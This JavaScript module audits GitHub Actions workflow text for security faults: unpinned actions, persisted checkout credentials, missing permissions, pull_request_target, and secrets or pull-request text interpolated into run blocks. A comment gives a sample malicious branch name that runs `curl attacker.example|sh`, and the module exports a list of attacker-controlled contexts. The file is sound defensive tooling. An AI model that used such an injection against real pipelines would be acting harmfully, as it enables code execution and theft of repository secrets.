/**
 * Stage Q9 — what a GitHub Actions workflow in this repository is not allowed to do.
 *
 * The estate is two workflows and they are both sound today, which is exactly the moment to write
 * the rules down: a check adopted while everything passes costs nothing to satisfy, and a check
 * adopted after something has already gone wrong arrives with a backlog and an exception list.
 *
 * Every finding below names a real way a workflow becomes a way into the repository:
 *
 * - an unpinned action is somebody else's mutable tag running with your token;
 * - a checkout that persists credentials leaves that token in `.git/config` for every later step,
 *   including the ones that run code from the pull request;
 * - an undeclared `permissions` block inherits whatever the repository default happens to be, which
 *   is not a decision anyone made in this file;
 * - `pull_request_target` runs with repository secrets on a trigger a fork controls;
 * - a pull-request title interpolated into `run:` is a shell command a stranger wrote;
 * - a secret interpolated into `run:` is a secret on the command line, where the process table, the
 *   trace output and the error message can all see it.
 *
 * These are text checks rather than a YAML parse on purpose: no dependency, and the thing being
 * checked *is* the text — a rule that only holds after a parser has normalised the file is a rule
 * about the parser. `tooling/workflow-security.test.mjs` plants a violation of each one, because a
 * workflow gate that has only ever been run against clean workflows is not evidence.
 */

/**
 * Split a workflow into logical lines with their indentation, dropping comments.
 *
 * A `#` inside a quoted string is not a comment, and a rule that thinks otherwise would read half a
 * `run:` block and declare the rest safe.
 */
function lines(text) {
  return String(text ?? '').split('\n').map((raw, index) => {
    let inSingle = false;
    let inDouble = false;
    let content = raw;
    for (let cursor = 0; cursor < raw.length; cursor += 1) {
      const character = raw[cursor];
      if (character === "'" && !inDouble) inSingle = !inSingle;
      else if (character === '"' && !inSingle) inDouble = !inDouble;
      else if (character === '#' && !inSingle && !inDouble) { content = raw.slice(0, cursor); break; }
    }
    return { number: index + 1, raw, content, indent: raw.length - raw.trimStart().length, text: content.trim() };
  });
}

/** Actions that are part of the platform rather than a third party's mutable tag. */
function isLocalOrDocker(value) {
  return value.startsWith('./') || value.startsWith('docker://');
}

/**
 * Every `uses:` that names a third-party action without an immutable commit SHA.
 *
 * A tag is a name its owner can move. `@v4` today and `@v4` tomorrow are a promise, not a fact.
 */
export function unpinnedActions(text) {
  const findings = [];
  for (const line of lines(text)) {
    const match = line.text.match(/^-?\s*uses:\s*([^\s]+)/);
    if (!match) continue;
    const value = match[1];
    if (isLocalOrDocker(value)) continue;
    const separator = value.lastIndexOf('@');
    const ref = separator === -1 ? '' : value.slice(separator + 1);
    if (!/^[0-9a-f]{40}$/.test(ref)) {
      findings.push({ rule: 'action-not-pinned', line: line.number, detail: `${value} is not pinned to a 40-character commit SHA.` });
    }
  }
  return findings;
}

/**
 * Every `actions/checkout` step that does not turn off credential persistence.
 *
 * The default leaves the workflow token in the checkout's git config, where every later step can
 * read it — including whatever the repository's own scripts decide to run.
 */
export function checkoutsPersistingCredentials(text) {
  const all = lines(text);
  const findings = [];
  for (const [index, line] of all.entries()) {
    if (!/^-\s*uses:\s*actions\/checkout(@|$)/.test(line.text)) continue;
    let disabled = false;
    for (let cursor = index + 1; cursor < all.length; cursor += 1) {
      const candidate = all[cursor];
      if (candidate.text === '') continue;
      // The step ends at the next list item of the same indentation.
      if (candidate.indent <= line.indent && candidate.text.startsWith('- ')) break;
      if (candidate.indent <= line.indent && !candidate.text.startsWith('- ') && candidate.indent < line.indent) break;
      if (/^persist-credentials:\s*false\s*$/.test(candidate.text)) { disabled = true; break; }
    }
    if (!disabled) findings.push({ rule: 'checkout-persists-credentials', line: line.number, detail: 'actions/checkout must set persist-credentials: false.' });
  }
  return findings;
}

/**
 * A workflow that never says what its token may do, or that says "everything".
 *
 * An absent `permissions` block inherits the repository or organisation default. That default may
 * be read-only today and write tomorrow, and the change would not appear in any diff of this file.
 */
export function permissionFindings(text) {
  const all = lines(text);
  const findings = [];
  const topLevel = all.find((line) => line.indent === 0 && line.text.startsWith('permissions:'));
  if (!topLevel) {
    findings.push({ rule: 'permissions-not-declared', line: 1, detail: 'Declare a top-level permissions block; an absent one inherits whatever the repository default happens to be.' });
  }
  for (const line of all) {
    if (!/^permissions:\s*(\S.*)?$/.test(line.text)) continue;
    const inline = line.text.slice('permissions:'.length).trim();
    if (inline === 'write-all') {
      findings.push({ rule: 'permissions-write-all', line: line.number, detail: 'write-all grants every scope, which is the opposite of a declaration.' });
    }
  }
  return findings;
}

/**
 * `pull_request_target` runs with the base repository's secrets on a trigger a fork controls.
 *
 * Nothing here needs it. It is refused outright rather than conditionally, because the safe uses of
 * it are narrow, the unsafe ones look identical at a glance, and "we checked carefully" is not a
 * property a file can carry.
 */
export function pullRequestTargetFindings(text) {
  return lines(text)
    .filter((line) => /^-?\s*pull_request_target:?$/.test(line.text) || /^on:\s*pull_request_target\b/.test(line.text))
    .map((line) => ({ rule: 'pull-request-target-used', line: line.number, detail: 'pull_request_target runs with repository secrets on a fork-controlled trigger. Use pull_request.' }));
}

/**
 * Expression contexts a pull request's author controls.
 *
 * Interpolating one of these into a `run:` block substitutes the text *before* the shell sees it, so
 * a branch named `$(curl attacker.example|sh)` is a command rather than a name. The fix is always
 * the same shape: put the value in `env:` and let the shell read it as a variable.
 */
export const ATTACKER_CONTROLLED_CONTEXTS = Object.freeze([
  'github.event.issue.title',
  'github.event.issue.body',
  'github.event.pull_request.title',
  'github.event.pull_request.body',
  'github.event.pull_request.head.ref',
  'github.event.pull_request.head.label',
  'github.event.pull_request.head.repo.default_branch',
  'github.event.comment.body',
  'github.event.review.body',
  'github.event.review_comment.body',
  'github.event.discussion.title',
  'github.event.discussion.body',
  'github.event.head_commit.message',
  'github.event.head_commit.author.name',
  'github.event.head_commit.author.email',
  'github.event.commits',
  'github.event.workflow_run.head_branch',
  'github.event.workflow_run.head_commit.message',
  'github.head_ref',
]);

/**
 * Walk the `run:` blocks, which is where an interpolation becomes a command.
 *
 * A block scalar (`run: |`) continues while the indentation stays deeper than the `run:` key, so
 * this follows indentation rather than guessing at a terminator.
 */
function runBlocks(text) {
  const all = lines(text);
  const blocks = [];
  for (const [index, line] of all.entries()) {
    const match = line.text.match(/^-?\s*run:\s*(.*)$/);
    if (!match) continue;
    const body = [{ number: line.number, text: match[1] }];
    if (['|', '>', '|-', '>-', '|+', '>+'].includes(match[1].trim())) {
      for (let cursor = index + 1; cursor < all.length; cursor += 1) {
        const candidate = all[cursor];
        if (candidate.raw.trim() === '') { body.push({ number: candidate.number, text: '' }); continue; }
        if (candidate.indent <= line.indent) break;
        body.push({ number: candidate.number, text: candidate.content });
      }
    }
    blocks.push(body);
  }
  return blocks;
}

/** A pull-request author's text interpolated into a shell command. */
export function untrustedInterpolations(text) {
  const findings = [];
  for (const block of runBlocks(text)) {
    for (const line of block) {
      for (const match of line.text.matchAll(/\$\{\{([^}]*)\}\}/g)) {
        const expression = match[1].trim();
        const context = ATTACKER_CONTROLLED_CONTEXTS.find((candidate) => expression.includes(candidate));
        if (context) {
          findings.push({
            rule: 'untrusted-interpolation-in-run',
            line: line.number,
            detail: `${context} is written by whoever opened the pull request. Pass it through env: instead of substituting it into the shell.`,
          });
        }
      }
    }
  }
  return findings;
}

/**
 * A secret substituted into a command line rather than passed through the environment.
 *
 * `env:` keeps it out of the argv the process table shows, out of `set -x` output and out of the
 * command echoed in a failure. Interpolation puts it in all three.
 */
export function secretsOnCommandLines(text) {
  const findings = [];
  for (const block of runBlocks(text)) {
    for (const line of block) {
      for (const match of line.text.matchAll(/\$\{\{([^}]*)\}\}/g)) {
        if (/\bsecrets\./.test(match[1])) {
          findings.push({
            rule: 'secret-interpolated-into-run',
            line: line.number,
            detail: 'A secret substituted into a command appears in the process table and in traced output. Pass it through env: instead.',
          });
        }
      }
    }
  }
  return findings;
}

/** Every rule, applied to one workflow. */
export function auditWorkflow(text) {
  return [
    ...unpinnedActions(text),
    ...checkoutsPersistingCredentials(text),
    ...permissionFindings(text),
    ...pullRequestTargetFindings(text),
    ...untrustedInterpolations(text),
    ...secretsOnCommandLines(text),
  ].sort((left, right) => left.line - right.line || left.rule.localeCompare(right.rule));
}

export const WORKFLOW_SECURITY_RULES = Object.freeze([
  'action-not-pinned',
  'checkout-persists-credentials',
  'permissions-not-declared',
  'permissions-write-all',
  'pull-request-target-used',
  'untrusted-interpolation-in-run',
  'secret-interpolated-into-run',
]);
